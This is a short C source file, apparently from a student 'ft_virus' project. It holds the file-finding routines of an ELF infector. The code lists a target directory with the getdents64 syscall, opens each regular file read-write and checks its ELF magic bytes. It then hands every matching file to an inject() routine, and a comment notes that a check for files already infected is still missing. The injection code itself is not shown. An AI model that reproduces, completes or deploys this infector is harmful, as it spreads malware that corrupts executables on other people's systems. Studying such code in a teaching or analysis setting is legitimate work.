#include "ft_virus.h"

# define BUF_SIZE 1024

int FORCE_INLINE is_good_format(char *filename)
{
	char	buf[BUF_SIZE];
	int	fd;
	size_t	name_size;

	name_size = ft_strlen(filename);
	if (name_size + sizeof(INFESTED_DIR) > BUF_SIZE)
		return (-1);
	ft_memcpy(buf, INFESTED_DIR, sizeof(INFESTED_DIR) - 1);
	ft_memcpy(buf + sizeof(INFESTED_DIR) - 1, filename, name_size);
	buf[name_size + sizeof(INFESTED_DIR) - 1] = 0;
	fd = OPEN(buf, O_RDWR);
	if (fd < 0)
		return (fd);
	READ(fd, buf, sizeof(ELFMAG) - 1);
	if (ft_memcmp(buf, ELFMAG, sizeof(ELFMAG) - 1))
	{
		CLOSE(fd);
		return (-1);
	}
	// verify if not alread infected
	WRITE(1, filename, name_size);
	WRITE(1, "  OK\n", 5);
	return (fd);
}

int FORCE_INLINE finder(int dir_fd)
{
	int	nread;
	int	bpos;
	struct linux_dirent64 *d;
	char	buf[BUF_SIZE];
	int	file_fd;

	while(1)
	{
		nread = syscall(SYS_GETDENT64, dir_fd, buf, BUF_SIZE);
		if (!nread || nread == -1)
			return (0);
		bpos = 0;
		while (bpos < nread)
		{
			d = (struct linux_dirent64*)(buf + bpos);
			if (d->d_type == DT_REG && (file_fd = is_good_format(d->d_name)) != -1)
				inject(file_fd);
			bpos += d->d_reclen;
		}
	}
}
